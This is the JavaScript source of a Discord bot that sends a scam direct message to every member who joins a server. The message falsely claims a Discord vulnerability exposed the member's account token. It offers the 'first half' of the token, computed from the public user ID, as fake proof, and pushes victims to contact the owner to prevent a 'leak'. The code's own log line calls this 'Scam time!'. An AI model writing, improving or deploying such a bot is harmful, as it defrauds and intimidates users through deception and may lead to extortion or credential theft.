const fs = require('node:fs');
const path = require('node:path');
const { Client, Events, GatewayIntentBits, Collection, EmbedBuilder } = require('discord.js');
const { token } = require('./config.json');
const { getHalfToken } = require("./functions/token")
const { logTokenLeak, logFailedMessage } = require("./functions/log");

const client = new Client({
	intents: [
		GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers
	]
});


client.once(Events.ClientReady, c => {
	console.log(`Scam time! Logged in as ${c.user.tag}`);
});

client.on('guildMemberAdd', member => {
	const evilEmbed = new EmbedBuilder()
		.setColor(0xEDE7E6)
		.setTitle('Oops, Your Token Has Been Leaked!')
		.setURL('https://github.com/9ggy/')
		.setDescription('A critical vulnerability has been found in Discord, this has allowed us to grab your token just from you joining this server! For verification purposes the first half of your token has been supplied below. \n If you would like to whitelist your token from an imminent leak, directly message the owner.')
		.setThumbnail(member.displayAvatarURL())
		.addFields(
			{ name: 'Half of your Token:', value: '`' + getHalfToken(Number.toString(member.id)) + '`' },
		)
		.setTimestamp()
		.setFooter({ text: 'Tokenize - 9ggy' });

	try {
		member.send({ embeds: [evilEmbed] });
		logTokenLeak(client, member);
	} catch (error) {
		logFailedMessage(client, member);
	}
});

client.login(token);